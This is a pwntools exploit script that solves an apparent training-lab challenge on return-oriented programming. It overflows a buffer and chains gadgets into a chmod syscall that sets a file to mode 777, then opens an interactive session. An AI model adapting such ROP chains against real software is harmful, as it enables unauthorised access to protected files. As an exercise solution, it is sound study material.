from pwn import *

# Init
elf = ELF("/challenge/babyrop_level5.0")
context.arch = "amd64"
context.endian = "little"
io = elf.process()

# Vars
buffer_length = 124 + 4 + 8 # local_88 and variable int 4 byte (local_c) + EBP
io.recvuntil("concept of Return Oriented Programming!")


leaving_addr = p64(0x0040335a)
syscall_gadget = p64(0x0000000000401df1)
set_rdi_registry_gadget = p64(0x0000000000401e11)
set_rsi_registry_gadget = p64(0x0000000000401de1)
set_rax_registry_gadget = p64(0x0000000000401dea)
access_rights = p64(0o777)

# Payload
payload = b"A"*buffer_length + set_rax_registry_gadget + p64(0x5a) + set_rdi_registry_gadget + leaving_addr + set_rsi_registry_gadget + access_rights + syscall_gadget

# Action
io.sendline(payload)
io.interactive()